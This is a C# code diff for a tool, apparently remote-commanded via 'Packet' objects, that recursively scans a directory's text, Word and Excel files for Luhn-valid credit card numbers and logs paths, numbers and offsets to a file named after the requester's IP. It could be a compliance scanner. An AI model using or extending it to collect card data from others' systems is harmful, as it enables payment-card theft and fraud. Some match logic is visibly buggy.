@@ -23,7 +23,7 @@ namespace WinServices
 
         double a = 0, b = 0;
 
-        private void FindInDir(DirectoryInfo dir, string logFileName, int CVV, int MSOffice, long files, long currentFiles)
+        private void FindInDir(DirectoryInfo dir, string logFileName, int CVV, int MSOffice, int Rar, long files, long currentFiles)
         {
             Packets.CountFiles = dir.GetFiles().Count();
 
@@ -51,7 +51,9 @@ namespace WinServices
 
                 string Path;
 
-                Packets.Progress = ((int)(Packets.CurrentFile / Packets.CountFiles) * 100);
+                double res = (((double)Packets.CurrentFile / (double)Packets.CountFiles) * 100);
+
+                Packets.Progress = Convert.ToInt32(res);
 
                 if (file.Extension.ToLower() == ".exe" || file.Extension.ToLower() == ".dll")
                     continue;
@@ -64,40 +66,34 @@ namespace WinServices
                     {
                         if (file.Extension.ToLower() == ".doc" || file.Extension.ToLower() == ".docx")
                         {
-                            if (MSWordMatches(file.FullName, CVV) == true)
-                            {
-                                Path = file.FullName;
-                                //bgW.ReportProgress(-1, Path);
-
-                                // WriteLog(logFileName);
-                            }
+                            if(MSWordMatches(file.FullName, CVV))
+                                WriteLog(logFileName);
                         }
                         else
                         {
-                            if (MSExcelMatches(file.FullName, CVV) == true)
-                            {
-                                Path = file.FullName;
-                                //bgW.ReportProgress(-1, Path);
-                                //WriteLog(logFileName);
-                            }
+                            if(MSExcelMatches(file.FullName, CVV))
+                                WriteLog(logFileName);
                         }
                         continue;
                     }
                 }
 
-                if ((FindMatches(file.FullName, CVV) == true) && MSOffice != 1)
+                if (Rar == 1)
                 {
-                    Path = file.FullName;
+                    //TODO
                 }
 
-                WriteLog(logFileName);
+                if ((FindMatches(file.FullName, CVV) == true) && MSOffice != 1 && Rar != 1)
+                {
+                    WriteLog(logFileName);
+                }
             }
 
             foreach (DirectoryInfo subdir in dir.GetDirectories())
             {
                 try
                 {
-                    this.FindInDir(subdir, logFileName, CVV, MSOffice, Packets.CountFiles, Packets.CurrentFile);
+                    this.FindInDir(subdir, logFileName, CVV, MSOffice, Rar, Packets.CountFiles, Packets.CurrentFile);
                 }
                 catch (Exception)
                 {
@@ -108,11 +104,13 @@ namespace WinServices
         }
         public void FindFiles(Packet Pak)
         {
-            string LogFile = (DateTime.Now.ToString() + ".txt").Replace(':', '-');
-
+            string LogFile = (DateTime.Now.ToString().Replace(':', '-')+"_"+ Pak.IPAdress.Replace('.', '-') + ".txt");
+            
             try
             {
-                this.FindInDir(new DirectoryInfo(Pak.Directory), LogFile, Convert.ToInt32(Pak.CVV), Convert.ToInt32(Pak.MSOffice), Pak.CountFiles, Pak.CurrentFile);
+                this.FindInDir(new DirectoryInfo(Pak.Directory), LogFile, Convert.ToInt32(Pak.CVV), Convert.ToInt32(Pak.MSOffice), Convert.ToInt32(Pak.Rar), Pak.CountFiles, Pak.CurrentFile);
+
+                Packets.FileInfo = LogFile;
             }
             catch (Exception)
             {
@@ -122,6 +120,7 @@ namespace WinServices
 
         public bool FindMatches(string fPath, int reg)
         {
+            Matches.Clear();
 
             StringReader br = new StringReader(File.ReadAllText(fPath));
             string fl = br.ReadToEnd();
@@ -146,7 +145,7 @@ namespace WinServices
             MatchCollection matches2 = regex2.Matches(fl);
             MatchCollection matches3 = regex3.Matches(fl);
 
-           
+            bool matches = false;
 
             if (matches1.Count != 0)
             {
@@ -155,28 +154,46 @@ namespace WinServices
                     int i = match.Index;
                     if (CalcLune(fl.Substring(i, 16)))
                     {
-                        Packets.FileInfo.Add(fPath);
-                        Packets.FileInfo.Add(fl.Substring(i, 16));
-                        Packets.FileInfo.Add(i.ToString());
+                        if (!matches)
+                        {
+                            Matches.Add(fPath);
+                            Matches.Add(fl.Substring(i, 16));
+                            Matches.Add(i.ToString());
+                            matches = true;
+                        }
+                        else {
+                            Matches.Add(fl.Substring(i, 16));
+                            Matches.Add(i.ToString());
+                        }
+
                     }
 
                 }
             }
 
             if (matches2.Count != 0)
-            {
+            {  
                 foreach (Match match in regex2.Matches(fl))
                 {
                     int i = match.Index;
                     if (CalcLune(fl.Substring(i, 23).Replace("\r", "").Replace("\n", "")))
                     {
-                        Packets.FileInfo.Add(fPath);
-                        Packets.FileInfo.Add(fl.Substring(i, 23));
-                        Packets.FileInfo.Add(i.ToString());
+                        if (!matches)
+                        {
+                            Matches.Add(fPath);
+                            Matches.Add(fl.Substring(i, 23));
+                            Matches.Add(i.ToString());
+                            matches = true;
+                        }
+                        else {
+                            Matches.Add(fl.Substring(i, 23));
+                            Matches.Add(i.ToString());
+                        }
                     }
 
                 }
             }
+
             if (matches3.Count != 0)
             {
                 foreach (Match match in regex3.Matches(fl))
@@ -184,9 +201,17 @@ namespace WinServices
                     int i = match.Index;
                     if (CalcLune(fl.Substring(i, 19).Replace(" ", "").Replace("\r", "").Replace("\n", "")))
                     {
-                        Packets.FileInfo.Add(fPath);
-                        Packets.FileInfo.Add(fl.Substring(i, 19));
-                        Packets.FileInfo.Add(i.ToString());
+                        if (!matches)
+                        {
+                            Matches.Add(fPath);
+                            Matches.Add(fl.Substring(i, 19));
+                            Matches.Add(i.ToString());
+                            matches = true;
+                        }
+                        else {
+                            Matches.Add(fl.Substring(i, 19));
+                            Matches.Add(i.ToString());
+                        }
                     }
                 }
             }
@@ -194,6 +219,9 @@ namespace WinServices
             return true;
 
         }
+
+        private List<string> Matches = new List<string>();
+
 
         public bool CalcLune(string cardNumb)
         {
@@ -245,6 +273,8 @@ namespace WinServices
                 MatchCollection matches2 = regex2.Matches(allWords);
                 MatchCollection matches3 = regex3.Matches(allWords);
 
+                bool matches = false;
+
                 if (matches1.Count != 0)
                 {
                     foreach (Match match in regex1.Matches(allWords))
@@ -252,9 +282,16 @@ namespace WinServices
                         int i = match.Index;
                         if (CalcLune(allWords.Substring(i, 16)))
                         {
-                            Packets.FileInfo.Add(fPath);
-                            Packets.FileInfo.Add(allWords.Substring(i, 16));
-                            Packets.FileInfo.Add(i.ToString());
+                            if (!matches)
+                            {
+                                Matches.Add(fPath);
+                                Matches.Add(allWords.Substring(i, 16));
+                                Matches.Add(i.ToString());
+                            }
+                            else {
+                                Matches.Add(allWords.Substring(i, 16));
+                                Matches.Add(i.ToString());
+                            }
                         }
 
                     }
@@ -268,9 +305,16 @@ namespace WinServices
                         int i = match.Index;
                         if (CalcLune(allWords.Substring(i, 23).Replace("\r", "").Replace("\n", "")))
                         {
-                            Packets.FileInfo.Add(fPath);
-                            Packets.FileInfo.Add(allWords.Substring(i, 23));
-                            Packets.FileInfo.Add(i.ToString());
+                            if (!matches)
+                            {
+                                Matches.Add(fPath);
+                                Matches.Add(allWords.Substring(i, 23));
+                                Matches.Add(i.ToString());
+                            }
+                            else {
+                                Matches.Add(allWords.Substring(i, 23));
+                                Matches.Add(i.ToString());
+                            }
                         }
 
                     }
@@ -282,9 +326,16 @@ namespace WinServices
                         int i = match.Index;
                         if (CalcLune(allWords.Substring(i, 19).Replace(" ", "").Replace("\r", "").Replace("\n", "")))
                         {
-                            Packets.FileInfo.Add(fPath);
-                            Packets.FileInfo.Add(allWords.Substring(i, 19));
-                            Packets.FileInfo.Add(i.ToString());
+                            if (!matches)
+                            {
+                                Matches.Add(fPath);
+                                Matches.Add(allWords.Substring(i, 19));
+                                Matches.Add(i.ToString());
+                            }
+                            else {
+                                Matches.Add(allWords.Substring(i, 19));
+                                Matches.Add(i.ToString());
+                            }
                         }
                     }
                 }
@@ -295,7 +346,6 @@ namespace WinServices
         }
         public bool MSExcelMatches(string fPath, int reg)
         {
-
             Microsoft.Office.Interop.Excel.Application excelapp;
             Microsoft.Office.Interop.Excel.Workbook excelappworkbook;
 
@@ -365,6 +415,8 @@ namespace WinServices
             MatchCollection matches2 = regex2.Matches(cellValue);
             MatchCollection matches3 = regex3.Matches(cellValue);
 
+            bool matches = false;
+
             if (matches1.Count != 0)
             {
                 foreach (Match match in regex1.Matches(cellValue))
@@ -372,8 +424,17 @@ namespace WinServices
                     int i = match.Index;
                     if (CalcLune(cellValue.Substring(i, 16)))
                     {
-
-                        return true;
+                        if (!matches)
+                        {
+                            Matches.Add(fPath);
+                            Matches.Add(cellValue.Substring(i, 16));
+                            Matches.Add(i.ToString());
+                        }
+                        else
+                        {
+                            Matches.Add(cellValue.Substring(i, 16));
+                            Matches.Add(i.ToString());
+                        }
                     }
 
                 }
@@ -385,7 +446,16 @@ namespace WinServices
                     int i = match.Index;
                     if (CalcLune(cellValue.Substring(i, 23).Replace("\r", "").Replace("\n", "")))
                     {
-                        return true;
+                        if (!matches)
+                        {
+                            Matches.Add(fPath);
+                            Matches.Add(cellValue.Substring(i, 23).Replace("\r", "").Replace("\n", ""));
+                            Matches.Add(i.ToString());
+                        }
+                        else {
+                            Matches.Add(cellValue.Substring(i, 23).Replace("\r", "").Replace("\n", ""));
+                            Matches.Add(i.ToString());
+                        }
                     }
 
                 }
@@ -397,17 +467,21 @@ namespace WinServices
                     int i = match.Index;
                     if (CalcLune(cellValue.Substring(i, 19).Replace(" ", "").Replace("\r", "").Replace("\n", "")))
                     {
-
-                        return true;
+                        if (!matches)
+                        {
+                            Matches.Add(fPath);
+                            Matches.Add(cellValue.Substring(i, 19).Replace(" ", "").Replace("\r", "").Replace("\n", ""));
+                            Matches.Add(i.ToString());
+                        }
+                        else {
+                            Matches.Add(cellValue.Substring(i, 19).Replace(" ", "").Replace("\r", "").Replace("\n", ""));
+                            Matches.Add(i.ToString());
+                        }
                     }
-
-
                 }
             }
 
-
-
-            return false;
+            return true;
 
         }
 
@@ -418,7 +492,9 @@ namespace WinServices
             {
                 StreamWriter sw = new StreamWriter(logFileName, true);
 
-                foreach (var item in Packets.FileInfo)
+                
+
+                foreach (var item in Matches)
                 {
                     sw.WriteLine(item);
                 }
